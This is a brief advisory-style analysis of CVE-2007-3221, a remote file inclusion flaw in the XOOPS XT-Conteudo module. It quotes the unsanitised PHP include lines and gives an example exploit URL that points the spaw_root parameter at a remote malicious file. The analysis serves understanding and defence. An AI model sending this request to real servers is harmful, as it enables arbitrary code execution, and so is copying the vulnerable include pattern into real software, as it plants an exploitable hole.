Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2007-3221:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) vulnerability in the XT-Conteudo module for XOOPS CMS.
*   The `spaw_root` variable in `admin/spaw/spaw_control.class.php` is not properly sanitized, allowing an attacker to include remote files.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application includes files based on user-controlled input via the `spaw_root` parameter.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to complete compromise of the server and the data it hosts.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability can be exploited through a crafted HTTP GET request by manipulating the `spaw_root` parameter.
    *   Example: `http://[site]/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=[malicious_url]?`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to have network access to the vulnerable server.
*   **No Authentication Required**: The vulnerability is directly exploitable through HTTP requests and does not appear to require authentication.

**Additional Notes:**

*   The exploit-db entry provides a clear description of the vulnerability and how to exploit it.
*   The vulnerable code snippet:
    ```php
    include $spaw_root.'config/spaw_control.config.php';
    include $spaw_root.'class/toolbars.class.php';
    include $spaw_root.'class/lang.class.php';
    ```
    shows that the `spaw_root` variable is directly used to construct file paths for inclusion, without proper validation or sanitization.
